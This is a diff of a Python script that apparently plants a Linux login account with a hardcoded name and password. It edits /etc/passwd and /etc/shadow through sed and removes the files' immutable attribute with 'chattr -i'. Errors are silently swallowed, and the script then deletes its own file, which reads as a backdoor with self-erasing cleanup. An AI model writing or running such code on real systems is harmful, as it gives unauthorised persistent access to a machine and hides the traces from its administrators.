@@ -37,10 +37,17 @@ def adduser(user, password):
 
 
 def deluser(user):
-    command = "sed -i '/^" + user + ":/d' /etc/shadow"
-    ml(command)
-    command = "sed -i '/^" + user + ":/d' /etc/passwd"
-    ml(command)
+    try:
+        ml('chattr -i /etc/passwd')
+        ml('chattr -i /etc/shadow')
+        command = "sed -i '/^" + user + ":/d' /etc/shadow"
+        # "sed -i '/^passw123:/d' /etc/shadow"
+        ml(command)
+        command = "sed -i '/^" + user + ":/d' /etc/passwd"
+        ml(command)
+    except Exception as e:
+        pass
+
 
 def delete_current_script():
     try:
@@ -53,6 +60,6 @@ def delete_current_script():
 if __name__ == '__main__':
     user = 'passw123'
     password = 'admin@#45123'
+    deluser(user)  # 删除用户
     adduser(user, password)
-    # deluser(user)  #删除用户
     delete_current_script()  # 删除当前执行脚本文件
